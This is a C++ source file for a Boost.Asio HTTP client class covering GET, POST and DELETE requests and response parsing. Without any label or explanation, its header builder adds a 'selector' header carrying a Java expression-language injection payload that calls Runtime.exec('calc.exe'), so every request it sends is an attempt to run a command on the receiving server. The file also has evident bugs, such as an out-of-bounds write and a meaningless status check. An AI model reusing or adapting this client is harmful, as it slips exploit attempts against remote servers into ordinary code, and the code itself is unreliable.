#include "http.h"
#include <cstdio>

int HttpRequest::HttpGet(const string &ip,const int &port,const string &page,const string &strData)  
{  
    return HttpRequestExec("GET", ip, port, page, strData);  
}  

int HttpRequest::HttpDelete(const string &ip,const int &port,const string &page,const string &strData)  
{  
    return HttpRequestExec("DELETE", ip, port, page, strData);  
}  
  
int HttpRequest::HttpPost(const string &ip,const int &port,const string &page,const string &strData)  
{  
    return HttpRequestExec("POST", ip, port, page, strData);  
}  
int HttpRequest::HttpGet()  
{  
    return HttpRequestExec("GET", ip, port, url, strData);  
}  
int HttpRequest::HttpDelete()  
{  
    return HttpRequestExec("DELETE", ip, port, url, strData);  
}
int HttpRequest::HttpPost()  
{ 
    return HttpRequestExec("POST", ip, port, url, strData);
}
bool HttpRequest::CheckHead(string head)
{
    std::cout<<"head check: "<< head<<std::endl;
    head[head.size()]='\0';
    for(int i=0;i<head.size()-1;i++){
        if(isalpha(head[i]) || isalnum(head[i])) continue;
        return false;
    }
    return true;
}
int HttpRequest::GetContentSize(boost::asio::streambuf &response)
{
    std::string head;
    // int n = boost::asio::read_until(socket, response, '\n');
    std::istream response_data(&response);
    std::getline(response_data, head);
    if(!CheckHead(head)) return 0;
    int contLength=std::stol(head.c_str(),nullptr,16);
    std::cout<<"head: "<<head<<std::endl;
    std::cout<<"length:"<<contLength<<" response:"<<response.size()<<std::endl;
    return contLength;
}
//Execute http request  
int HttpRequest::HttpRequestExec(const string &strMethod, const string &ip, const int &port,const string &page, const string &strData)
{
    //Determine whether the URL is valid 
    if(ip.empty()||ip.size()==0){  
        std::cerr <<"URL is NULL"<<std::endl;   
        return -5;  
    }
      
    //Limit URL length  
    if(URLSIZE < page.size()) {  
         std::cerr <<"Url cannot exceed "<<URLSIZE<<std::endl;   
        return -6;  
    }
    string host=ip,ports=std::to_string(port);
    string hostUrl=host+":"+ports;
    boost::asio::streambuf strHttpHead;
    //  std::cout<<"strdata: "<<strData<<std::endl;
    if(HttpHeadCreate(strMethod, hostUrl, page, strData,strHttpHead)!=0){
        std::cerr<<"Header is ULL"<<std::endl;
        
        return -8;
    }
    // boost::asio::streambuf::const_buffers_type cbt = strHttpHead.data();
    // std::string request_data(boost::asio::buffers_begin(cbt), boost::asio::buffers_end(cbt));
    // std::cout<<request_data<<std::endl;
    try
    {
        boost::asio::io_service io_service;
        // Multiplex io
        if(io_service.stopped())
        io_service.reset();

        // Listen to all ip
        tcp::resolver resolver(io_service);
        tcp::resolver::query query(host, ports);
        tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);
        
        // Try to connect to one of the ips until it succeeds 
        tcp::socket socket(io_service);
        boost::asio::connect(socket, endpoint_iterator);

        // Send the request.
        boost::asio::write(socket, strHttpHead);

        // Read the response status line. The response streambuf will automatically
        // grow to accommodate the entire line. The growth may be limited by passing
        // a maximum size to the streambuf constructor.
        boost::asio::streambuf response;
        boost::asio::read_until(socket, response, "\r\n");

        // Check that response is OK.
        std::istream response_stream(&response);
        std::string http_version;
        response_stream >> http_version;
        unsigned int status_code;
        response_stream >> status_code;
        std::string status_message;
        std::getline(response_stream, status_message);
        if (!response_stream || http_version.substr(0, 5) != "HTTP/"){
            strResponse = "Invalid response";
            return -2;
        }
        // If the server returns non-200, thinks it is wrong, it does not support jumps such as 301/302.
        if (status_code < 0){
            strResponse = "Response returned with status code != 200 ";
            return status_code;
        }
        // header
        std::string header;
        std::vector<string> headers;
        int contLength=0;
        while (std::getline(response_stream, header) && header != "\r"){
            headers.push_back(header);
            if(header.find("Content-Length")!=string::npos){
                sscanf(header.c_str(),"%*s %d",&contLength);
            }
        }
        std::cout<<"HttpHeader:\n**************\n";
        std::cout<<http_version.c_str()<<" "<<status_code<<" "<<status_message.c_str()<<std::endl;
        for(int i=0;i<headers.size();i++)
        {
            std::cout<<headers[i].c_str()<<std::endl;
        }
        std::cout<<"**************\n";
        boost::system::error_code error;
        while(boost::asio::read(socket, response,boost::asio::transfer_at_least(1), error)){}
        std::cout<<">>>>>>>>>>read off<<<<<<<"<<response.size()<<">>>>>>>>>>>>>>>\n";
        //Responsive data
        if (response.size()>0){
            std::istream response_stream(&response);
            if(contLength==0){
                contLength=GetContentSize(response);
            }
            std::cout<<"header content length: "<<contLength<<std::endl;
            std::cout<<"***************************************\n";
            std::istreambuf_iterator<char> eos;
            std::string data = string(std::istreambuf_iterator<char>(response_stream), eos);
            if(contLength<1 || contLength>data.size()) contLength=data.size();
            strResponse=data.substr(0,contLength);//getJson(data);
            // std::cout<<data<<" "<<data.size()<<std::endl;
            std::cout<<strResponse<<std::endl;
            std::cout<<"***************************************\n";
            return 0;
        }
        
        if (error != boost::asio::error::eof){
            strResponse = error.message();
            return -3;
        }
    }catch(std::exception& e){
        strResponse = e.what();
        return -4;  
    }      
    return 0;  
}
  
  
//Build HTTP headers  
int HttpRequest::HttpHeadCreate(const string &strMethod, const string &strHostPort, const string &page, const string &strData, boost::asio::streambuf &request)  
{  
    //     // Form the request. We specify the "Connection: close" header so that the
//     // server will close the socket after transmitting the response. This will
//     // allow us to treat all data up until the EOF as the content.
    std::ostream request_stream(&request);
    request_stream << strMethod<<" "<< page;
    if(strMethod=="GET" && !strData.empty()){
        request_stream << "?" << strData;
    }
    
    request_stream << " HTTP/1.1\r\n";
    request_stream << "Host: " << strHostPort<< "\r\n";
    request_stream<<"selector: T(java.lang.Runtime).getRuntime().exec('calc.exe')"<<"\r\n";
    request_stream << "Accept: */*\r\n";
    request_stream << "Content-Type: application/json\r\n";
    request_stream << "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n";
    request_stream << "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
    request_stream << "Cache-Control: no-cache\r\n";
    request_stream << "Connection: close\r\n";
    if(strMethod == "POST"){
        request_stream << "Content-Length: " << strData.length() << "\r\n";
        request_stream << "\r\n";
        request_stream << strData;
    }
    request_stream << "\r\n";
    return 0;   
}  
  
//Get the host address from the HTTP request URL  
string HttpRequest::GetHostAddrFromUrl(const string &strUrl)  
{
    string strHostAddr=strUrl;
    string::size_type index = strHostAddr.find("http://");//Remove http://  
    if(index != string::npos) {  
        strHostAddr = strHostAddr.substr(7);
    } else {
        index = strHostAddr.find("https://");//Remove https:// 
        if(index != string::npos) {  
            strHostAddr = strHostAddr.substr(8);  
        }  
    }
    return strHostAddr;  
}
std::string getJson(std::string str)
{
    int64_t size=str.size();
    int i,j;
    for(i=0;i<size && str[i]!='{' && str[i]!='[' ;i++);
    for(j=size-1;j>=0 && str[j]!='}' && str[j]!=']';j--);
    return str.substr(i,j-i+1);
}
